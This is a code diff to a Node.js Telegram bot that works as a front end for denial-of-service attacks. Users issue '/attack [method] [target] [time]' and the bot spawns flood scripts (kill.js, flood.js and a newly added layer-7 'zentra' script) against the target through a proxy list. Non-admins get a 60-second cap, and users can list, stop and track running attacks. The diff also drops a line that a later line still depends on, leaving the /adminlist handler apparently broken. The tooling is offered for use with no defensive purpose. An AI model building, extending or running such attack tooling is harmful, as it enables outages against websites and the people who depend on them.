@@ -72,7 +72,6 @@ bot.onText(/\/adminlist/, async (msg) => {
   const chatId = msg.chat.id
   const admins = await loadJson(ADMIN_LIST_PATH)
   const isAdmin = Object.keys(admins).includes(String(msg.from.id))
-  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
   const isGroupActive = groupSettings[msg.chat.id]?.botStatus === true
 
   if (!isAdmin && !isGroupActive) return
@@ -81,13 +80,25 @@ bot.onText(/\/adminlist/, async (msg) => {
   bot.sendMessage(chatId, '```json\n' + JSON.stringify({ adminList }, null, 2) + '\n```', { parse_mode: 'Markdown' })
 })
 
+bot.onText(/\/methods/, async (msg) => {
+  const chatId = msg.chat.id
+  const admins = await loadJson(ADMIN_LIST_PATH)
+  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
+  const isAdmin = Object.keys(admins).includes(String(msg.from.id))
+  const isGroupActive = groupSettings[msg.chat.id]?.botStatus === true
+
+  if (!isAdmin && !isGroupActive) return
+
+  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra')
+})
+
 bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
   const chatId = msg.chat.id
   const admins = await loadJson(ADMIN_LIST_PATH)
   const isAdmin = Object.keys(admins).includes(String(msg.from.id))
 
   if (!isAdmin) {
-    bot.sendMessage(chatId, '```json\n' + JSON.stringify({ error: 'Only admins can toggle bot status' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    bot.sendMessage(chatId, 'Only admins can toggle bot status')
     return
   }
 
@@ -116,7 +127,7 @@ bot.on('message', async (msg) => {
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
     if (args.length !== 3) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/attack [method] [target] [time]' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Usage: /attack [method] [target] [time]')
       return
     }
 
@@ -126,24 +137,29 @@ bot.on('message', async (msg) => {
     const thread = 10
     const proxy = './proxy.txt'
 
-    if (!['kill', 'flood'].includes(method) || !target || isNaN(time)) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Invalid method or arguments' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    if (!['kill', 'flood', 'zentra'].includes(method)) {
+      bot.sendMessage(id, 'Method must be "kill", "flood", or "zentra"')
+      return
+    }
+
+    if (!target || isNaN(time)) {
+      bot.sendMessage(id, 'Invalid arguments')
       return
     }
 
     if (!isAdmin && time > 60) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Attack time must be ≤ 60 seconds for non-admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Attack time must be ≤ 60 seconds for non-admins')
       return
     }
 
     try {
       await fs.access(proxy)
     } catch (err) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Proxy file not found' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Proxy file not found')
       return
     }
 
-    const scriptFile = method === 'kill' ? './kill.js' : './flood.js'
+    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : './l7-zentra.js'
     const cmd = spawn('node', [scriptFile, target, time, rate, thread, proxy], { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
     activeAttacks[attackId] = { cmd, target, time, rate, thread, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now() }
@@ -174,6 +190,8 @@ bot.on('message', async (msg) => {
       }
     })
     activeAttacks[attackId].messageId = sentMsg.message_id
+
+    bot.sendMessage(id, `Attack started on ${target} using ${method} method for ${time} seconds`)
 
     const interval = setInterval(async () => {
       if (!activeAttacks[attackId]) {
@@ -221,19 +239,19 @@ bot.on('message', async (msg) => {
 
     cmd.stderr.on('data', (data) => {
       console.error(`Script error: ${data}`)
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: `${scriptFile}: ${data}` }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, `${scriptFile}: ${data}`)
     })
 
     cmd.on('error', (err) => {
       clearInterval(interval)
       delete activeAttacks[attackId]
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, `Error: ${err.message}`)
     })
 
     cmd.on('close', (code) => {
       clearInterval(interval)
       delete activeAttacks[attackId]
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code, target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, `Attack on ${target} finished with code ${code}`)
     })
 
     setTimeout(() => {
@@ -262,33 +280,33 @@ bot.on('message', async (msg) => {
   if (text.startsWith('/stop')) {
     const args = text.split(/\s+/).slice(1)
     if (args.length !== 1) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: '/stop <index>' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Usage: /stop <index>')
       return
     }
     const key = args[0]
     const attack = activeAttacks[key]
     if (!attack) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Attack not found' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Attack not found')
       return
     }
     if (!isAdmin && attack.userId !== userId) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Permission denied' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Permission denied')
       return
     }
     attack.cmd.kill()
     delete activeAttacks[key]
-    bot.sendMessage(id, '```json\n' + JSON.stringify({ stopped: true, target: attack.target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+    bot.sendMessage(id, `Attack on ${attack.target} stopped`)
   }
 
   if (text.startsWith('/add') && msg.reply_to_message) {
     if (!isAdmin) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Only admins can add new admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Only admins can add new admins')
       return
     }
     const newAdminId = String(msg.reply_to_message.from.id)
     const newAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
     if (admins[newAdminId]) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'User is already an admin' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'User is already an admin')
       return
     }
     admins[newAdminId] = newAdminName
@@ -298,13 +316,13 @@ bot.on('message', async (msg) => {
 
   if (text.startsWith('/remove') && msg.reply_to_message) {
     if (!isAdmin) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'Only admins can remove admins' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'Only admins can remove admins')
       return
     }
     const removeAdminId = String(msg.reply_to_message.from.id)
     const removeAdminName = msg.reply_to_message.from.first_name + (msg.reply_to_message.from.last_name || '')
     if (!admins[removeAdminId]) {
-      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: 'User is not an admin' }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      bot.sendMessage(id, 'User is not an admin')
       return
     }
     delete admins[removeAdminId]
